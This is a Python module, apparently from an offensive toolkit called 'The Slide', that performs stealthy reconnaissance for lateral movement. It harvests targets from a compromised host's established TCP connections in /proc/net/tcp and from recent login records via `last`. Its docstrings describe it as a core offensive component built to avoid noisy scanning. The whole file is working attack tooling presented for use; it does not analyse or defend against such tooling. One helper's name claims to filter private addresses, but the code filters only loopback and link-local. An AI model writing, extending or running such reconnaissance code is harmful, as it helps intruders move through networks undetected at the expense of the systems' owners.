# sovereign_movement/slide/policy_recon.py
"""
PolicyAwareRecon — Policy-Respecting Reconnaissance for The Slide

Discovers targets that the current host is *already permitted* to reach
according to existing microsegmentation, service mesh, or firewall policies.

This is a core component of The Slide's offensive movement strategy.
Instead of noisy scanning, it reads local artifacts that reveal allowed paths.
"""

from __future__ import annotations
from typing import List, Optional
import subprocess
import logging

logger = logging.getLogger("sovereign.slide.policy_recon")


class PolicyAwareRecon:
    """
    Discovers policy-permitted targets for sovereign lateral movement.

    Designed to work with modern microsegmentation environments
    (Cilium, Consul, Guardicore, Illumio, Kubernetes NetworkPolicy, etc.).
    """

    def __init__(self, max_targets: int = 15):
        self.max_targets = max_targets

    def discover(self) -> List[str]:
        """
        Main entry point. Returns a list of targets the host is
        likely allowed to communicate with.
        """
        targets: set[str] = set()

        # Priority 1: Existing outbound connections (strongest signal)
        targets.update(self._get_existing_outbound_connections())

        # Priority 2: Recent successful remote logins (very stealthy)
        targets.update(self._get_recent_ssh_targets())

        # Priority 3: Service mesh / orchestration artifacts (future expansion)
        targets.update(self._get_service_mesh_targets())

        # Limit results for operational safety
        result = list(targets)[: self.max_targets]

        logger.debug(f"[PolicyRecon] Discovered {len(result)} policy-permitted targets")
        return result

    # ============================================================
    # Discovery Methods
    # ============================================================

    def _get_existing_outbound_connections(self) -> set[str]:
        """Read /proc/net/tcp to find currently established outbound connections."""
        targets: set[str] = set()

        try:
            with open("/proc/net/tcp", "r") as f:
                for line in f.readlines()[1:]:  # Skip header
                    parts = line.strip().split()
                    if len(parts) < 3:
                        continue

                    remote = parts[2]  # remote_address:port in hex
                    if remote == "00000000:0000":
                        continue

                    try:
                        ip_hex, _ = remote.split(":")
                        ip = self._hex_to_ip(ip_hex)
                        if ip and not self._is_private_or_loopback(ip):
                            targets.add(ip)
                    except ValueError:
                        continue

        except FileNotFoundError:
            logger.debug("[PolicyRecon] /proc/net/tcp not available")
        except Exception as e:
            logger.warning(f"[PolicyRecon] Error reading /proc/net/tcp: {e}")

        return targets

    def _get_recent_ssh_targets(self) -> set[str]:
        """Parse recent SSH connections from `last` command (very low noise)."""
        targets: set[str] = set()

        try:
            result = subprocess.run(
                ["last", "-n", "30", "-i"],
                capture_output=True,
                text=True,
                timeout=6,
            )
            for line in result.stdout.splitlines():
                parts = line.split()
                if len(parts) > 2:
                    potential_ip = parts[2]
                    if self._is_valid_ip(potential_ip):
                        targets.add(potential_ip)
        except Exception:
            pass

        return targets

    def _get_service_mesh_targets(self) -> set[str]:
        """
        Placeholder for future service mesh / Kubernetes discovery.
        Examples: reading Consul catalog, Kubernetes Endpoints, Cilium identities, etc.
        """
        # TODO: Implement real service mesh discovery when needed
        return set()

    # ============================================================
    # Helpers
    # ============================================================

    def _hex_to_ip(self, hex_ip: str) -> Optional[str]:
        """Convert hex IP (from /proc/net/tcp) to dotted decimal notation."""
        try:
            ip_int = int(hex_ip, 16)
            return ".".join(str((ip_int >> (8 * i)) & 0xFF) for i in range(4))
        except (ValueError, TypeError):
            return None

    def _is_valid_ip(self, ip: str) -> bool:
        import ipaddress
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False

    def _is_private_or_loopback(self, ip: str) -> bool:
        """Filter out loopback and link-local addresses."""
        return ip.startswith(("127.", "169.254.", "::1"))


# ============================================================
# Quick standalone test
# ============================================================
if __name__ == "__main__":
    recon = PolicyAwareRecon(max_targets=10)
    targets = recon.discover()
    print(f"Policy-permitted targets found: {targets}")